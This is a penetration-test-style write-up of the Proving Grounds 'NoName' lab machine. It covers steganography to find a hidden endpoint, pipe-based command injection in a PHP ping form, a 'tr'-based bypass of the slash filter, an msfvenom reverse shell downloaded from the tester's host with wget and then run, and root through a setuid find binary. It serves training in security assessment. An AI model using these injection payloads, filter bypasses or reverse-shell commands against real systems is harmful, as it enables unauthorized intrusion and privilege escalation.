# Penetration Test Report for Proving Grounds - NoName
- **Author:** Joey Melo
- **Date:** March 18, 2022
- **Client:** Proving Grounds
- **Host:** 192.168.88.15 (NoName)

## Disclaimer
The following report is the solution of a challenge in a learning platform that has no association whatsoever with the author. Please consider this report as a rough simulation of what a real pentesting report looks like. Attempting to use the methodologies demonstrated in this report in unauthorized clients is ILLEGAL. The author is not responsible for improper use or unauthorized modifications of this information. The author assumes no liability for the use of information disclosed in this report. Any damage or loss that may result from improper use of the information contained in this report is the sole responsibility of the user and not the author. The author recommends safe practices and an ethical standpoint when working with clients and or with tools demonstrated in this report.

## Introduction
This penetration test report contains all efforts that were conducted in order to assess the security of Proving Grounds. This report contains all items that were used to penetrate and gain privileged access to the remote host(s). The purpose of this report is to showcase that the tester has a full understanding of penetration testing methodologies as well as the technical knowledge to perform professional cybersecurity assessments.

## Objectives
The objective of this assessment is to perform an internal penetration test against the NoName network. The tester is tasked with following methodical approach in obtaining access to the objective goals. This test should simulate an actual penetration test and how one would start from beginning to end, including the overall report.

## Executive Summary
The tester was tasked with performing an internal penetration test towards the NoName network. An internal penetration test is a dedicated attack against internally connected systems. The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Proving Grounds's internal lab systems. The tester's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Proving Grounds.
When performing the internal penetration test, there were several alarming vulnerabilities that were identified on the NoName network. When performing the attacks, the tester was able to gain access to the machine, primarily due to exposed passwords in the web page source code and weak input sanitization in a php form. The host has been sucessfully exploited, and privileged access was gained in the machine.

## Recommendations
The tester recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future. One thing to remember is that these systems require frequent patching and, once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Assessment
## Service Enumeration
### Port Scan Results
**TCP:** 80
### HTTP Directories Found
- /index.php
- /admin
## Initial Access
### Vulnerability Explanation
The remote HTTP host exposes a passphrase in the source code of the */admin* enpoint. The passphrase can be used to extract embedded information in one of the image files stored in the website, which reveals a new endpoint, */superadmin.php*, which runs a php application that is vulnerable to remote code execution.
### Vulnerability Fix
Do not store passwords or passphrases in html comments. Harden input sanitization rules in the php form in the */superadmin* endopint to avoid rce.
### Attack Walkthrough
Upon manual enumeration of the available HTTP service, the tester verified an odd */admin* endpoint with images with a passphrase embedded in its source.

![/admin endpoint](https://imgur.com/O9Geg32l.png)

![Passphrase included in page source as comment](https://imgur.com/Z3k1zGt.png)

The tester then downloaded the images and tried the passphrase to extract embedded information using the tool *steghide*.
```bash
wget http://192.168.88.15/new.jpg
wget http://192.168.88.15/ctf-01.jpg
wget http://192.168.88.15/haclabs.jpeg
wget http://192.168.88.15/Short.png
steghide extract -sf haclabs.jpeg # passphrase:harder
cat imp.txt | base64 -d
```
(moveup)The passphrased worked on *hacklabs.jpeg*, and the tester had access to a base64-encoded message which was easily decoded, revealing a secret endpoint in the HTTP server: */superadmin.php*

![File extracted and decoded from haclabs.jpeg](https://imgur.com/PDGKwvn.png)

![/superadmin.php endpoint](https://imgur.com/6DQZnNo.png)

Accessing the secret endpoint revealed a php form which was executing the *ping* command. Although some filtering was in place, the tester was able to bypass the filter by prepending the pipe (|) character to execute code and enumerate the system.
```bash
| id
| cat superadmin.php
```

![Source code of superadmin.php](https://imgur.com/ZkrQvbA.png)

The source code revealed that a list of words were filtered, including the backslash (/); however, the filtering was insufficient as the tester easily bypassed it issuing the following command:
```bash
| cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd

```

![Filter bypass](https://imgur.com/KRXXEs8.png)

Succesfully bypassing the filter, the tester was able upload a reverse shell to obtain initial access to the system.
```bash
# On local machine:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f elf -o revshell.elf
python3 -m http.server 80
nc -lvnp 1337
# On superadmin.php form:
| wget http:$(echo . | tr '!-0' '"-1')$(echo . | tr '!-0' '"-1')192.168.49.88$(echo . | tr '!-0' '"-1')revshell.elf -O $(echo . | tr '!-0' '"-1')tmp$(echo . | tr '!-0' '"-1')revshell
| chmod +x $(echo . | tr '!-0' '"-1')tmp$(echo . | tr '!-0' '"-1')revshell
| $(echo . | tr '!-0' '"-1')tmp$(echo . | tr '!-0' '"-1')revshell
```

As proof of exploitation, the tester captured the *local.txt* flag.

![User flag](https://imgur.com/iuG2wEq.png)

## Privilege Escalation
### Vulnerability Explanation
The */usr/bin/find* binary is running with setuid privileges. A low-privileged user may abuse this to obtain high-privileged access to the machine.
### Vulnerability Fix
Remove the setuid bit from */usr/bin/find*
### Attack Walkthrough
After establishing a foothold on the tagert, the tester noticed that the */usr/bin/find* binary was running with setuid privileges.
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null > suids.txt
cat suids.txt
```

![/usr/bin/find with setuid permissions](https://imgur.com/iLAlXN9.png)

The tester was able to abuse this misconfiguration to obtain a privileged shell.
```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

## Post-Exploitation
As proof of post-exploitation, the tester captured the *proof.txt* flag.

![Root flag](https://imgur.com/tc8MU2J.png)

# Appendix A: Commands Issued
```bash
# Enumeration
sudo nmap -sC -sV -oN tcp_ports.nmap -p- 192.168.88.15
gobuster dir -u http://192.168.189.107 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x php,html,txt -o directories.txt

# Inspect images
wget http://192.168.88.15/new.jpg
wget http://192.168.88.15/ctf-01.jpg
wget http://192.168.88.15/haclabs.jpeg
wget http://192.168.88.15/Short.png
steghide extract -sf haclabs.jpeg # passphrase:harder
cat imp.txt | base64 -d > imp-decoded.txt

# superadmin.php inspection
| id
| cat superadmin.php
| cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
| 'l's -la

# Preparing reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f elf -o revshell.elf
python3 -m http.server 80
nc -lvnp 1337

# superadmin.php reverse shell upload and execution
| wget http:$(echo . | tr '!-0' '"-1')$(echo . | tr '!-0' '"-1')192.168.49.88$(echo . | tr '!-0' '"-1')revshell.elf -O $(echo . | tr '!-0' '"-1')tmp$(echo . | tr '!-0' '"-1')revshell
| chmod +x $(echo . | tr '!-0' '"-1')tmp$(echo . | tr '!-0' '"-1')revshell
| $(echo . | tr '!-0' '"-1')tmp$(echo . | tr '!-0' '"-1')revshell

# Initial Access
cd /home/yash
cat local.txt

# Privilege Escalation
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null > suids.txt
cat suids.txt
/usr/bin/find . -exec /bin/bash -p \; -quit
id; pwd; cat proof.txt; ip a s
```
